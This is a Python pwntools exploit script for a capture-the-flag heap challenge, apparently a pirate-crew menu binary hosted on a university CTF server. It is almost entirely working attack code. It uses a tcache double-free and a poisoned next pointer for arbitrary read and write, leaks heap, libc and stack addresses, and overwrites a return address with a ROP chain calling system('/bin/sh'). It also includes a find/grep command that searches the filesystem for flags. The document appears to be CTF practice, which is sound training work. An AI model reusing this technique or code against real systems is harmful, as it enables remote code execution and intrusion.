#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
pad          = lambda sz: b'\x77' * sz
zeropad      = lambda sz: b'\x00' * sz
getflag      = b'find / -iname "*flag*" -exec grep -oE "TRX\\{.*\\}" {} 2>/dev/null \\;'


context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b *main+160
            b *nickname+99
            # b *recruit
            b *fight
            c
            c
            c
            c
            c
            """)
    elif cond == 3:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10302)

    return r


# struct pirateName{ 0x3c
#     char name[0x3c];
# } pirateName;


# struct Pirate { 0x10
#    int64_t hook;
#    struct pirateName *name;
#
# } Pirate;


# struc Crew {
#     struct Pirate pirates[3];
# } crew;


idx2Name = {
    0 : b"Captain",
    1 : b"Master",
    2 : b"Chef"
}

r = conn(3)
nRDWR = 0

def recruit(numPirate, hook = b"+"):
    r.sendlineafter(b">> ", b"1")
    r.sendlineafter(b">> ", str(numPirate).encode())
    r.sendlineafter(b"level: ", str(hook).encode())


def nickname(numPirate, name = b"JUNK"):
    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b">> ", str(numPirate).encode())
    r.sendafter(b"name: ", name)


def upgradeHook(numPirate, hook = b"+"):
    r.sendlineafter(b">> ", b"3")
    r.sendlineafter(b">> ", str(numPirate).encode())
    r.sendlineafter(b"level: ", str(hook).encode())


def fight():
    r.sendlineafter(b">> ", b"4")


def keelhaul(numPirate):
    r.sendlineafter(b">> ", b"5")
    r.sendlineafter(b">> ", str(numPirate).encode())


def alloc(idx, data = None):
    if data is None:
        data = b"+".ljust(0x08, b"\x00")
    recruit(idx + 1, data)

def upgrade(idx, data):
    upgradeHook(idx + 1, data)

def free(idx):
    keelhaul(idx + 1)


def demangle(ptr):
  key   = 0
  plain = 0
  for i in range(1, 6):
    bits = 64-12*i
    if bits < 0:
      bits = 0
    plain = ((ptr ^ key) >> bits) << bits
    key   = plain >> 12
  return plain


def read(idx):
    fight()
    r.recvuntil(idx2Name[idx] + b" ")
    name = r.recvuntil(b" ->")[:-3].ljust(0x8, b"\x00")
    r.recvuntil(b"hook_power: ")
    hook = int(r.recvline()[:-1].decode())
    return p64(hook) + name + b"\x00"


def writeHook(addr, value):
    free(0)     # NULL | Controled
    free(0)     # NULL | Controled -> Controled
    upgrade(0, addr) # chunck next    # NULL | Controled -> addr
    alloc(0)    # Controled | addr
    alloc(1)    # Constroled, addr | something

    free(2) # free to not mess up the bucket list
    upgrade(2, 0)
    alloc(2)
    log.info(f"Value: {str(u64(value)).encode()}")
    upgrade(1, u64(value))



def readMem(addr):
    global nRDWR
    # settup the heap for the read
    alloc(0)
    free(0)
    free(0)
    upgrade(0, leakHeap + 0x20 * nRDWR)
    alloc(0)
    alloc(0)

    free(0)
    free(0)
    upgrade(0, leakHeap + 0x8 + 0x20 * nRDWR) # pirate's name pointer
    alloc(0)
    alloc(1)

    upgrade(1, addr)
    nRDWR += 1
    return read(0)


def writeMem(addr, data):
    if data == b"":
       return
    firstCommand = data[:8]
    tmpData = data[8:]
    i = 1
    while len(tmpData) >= 8:
        log.info(f"Writing {i}")
        log.info(f"Data: {tmpData[:8]}")

        writeHook(addr + 8 * i, tmpData[:8])
        tmpData = tmpData[8:]
        i += 1

    writeHook(addr, firstCommand)



def plsGetMeOutOfHell():
  r.sendlineafter(b'>> ', b'6')


#----------------------------------------------

#Settup pirates
for i in range(3):
    alloc(i)

for i in range(3):
    free(i)

#----------------------------------------------

#Leak heap
leakHeap = u64(read(1)[:8])
log.success(f"Leaked heap @ {leakHeap:#x}")

#----------------------------------------------
#reset currect order
for i in range(2, -1, -1):
    alloc(i)

#----------------------------------------------

#see freeGotAddr
addrGotFree = e.got["free"]
log.success(f"free@got @ {addrGotFree:#x}")

#leak libc address
leakFreeLibc = u64(readMem(addrGotFree)[8:-1])
log.success(f"Leaked freeLibc @ {leakFreeLibc:#x}")

libc.address = leakFreeLibc - libc.sym["free"]
log.success(f"Leaked EnvironAddr @ {libc.sym["environ"]:#x}")

leakStack = u64(readMem(libc.sym["environ"])[8:-1])
log.success(f"Leaked stack @ {leakStack:#x}")

#----------------------------------------------

#Currect heap
for _ in range(7):
    alloc(0)

alloc(0)
alloc(1)
free(0)
free(1)
leakHeap = u64(read(1)[:8])
log.success(f"Leaked heap @ {leakHeap:#x}")

alloc(1)
upgradeHook(1 + 1, leakHeap + 0x40)
alloc(0)
upgradeHook(0 + 1, leakHeap + 0x20)

#----------------------------------------------
# set up chuncks for recovering the heap
for i in range(3, 0x100):
    alloc(0)
    upgradeHook(0 + 1, leakHeap + 0x20 * i)


#----------------------------------------------
# Calculate libc
sStack =            0x7fffffffd908
sRipUpHook =      0x7fffffffd7f8
offsetRipUpHook = sRipUpHook - sStack
log.success(f"Offset offsetRipUpHook @ {offsetRipUpHook:#x}")

lickRipUpHook = leakStack + offsetRipUpHook

log.success(f"lickRipUpHook @ {lickRipUpHook:#x}")

#----------------------------------------------
#Construct ROP-chain
rop = ROP(libc)
# Add a ret gadget for padding
rop.raw(rop.ret.address)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0]) # pop rdi; ret; in order to make the stack go 8 up
rop.raw(0xdeadbeefdeadbeef)  # Example trash value

binSh = next(libc.search(b'/bin/sh\x00'))
log.info(f"/bin/sh: {hex(binSh)}")

rop.call(libc.symbols['system'], (binSh,))

#----------------------------------------------
#Write ROP-chain and execute it
writeMem(lickRipUpHook, rop.chain())


r.interactive()

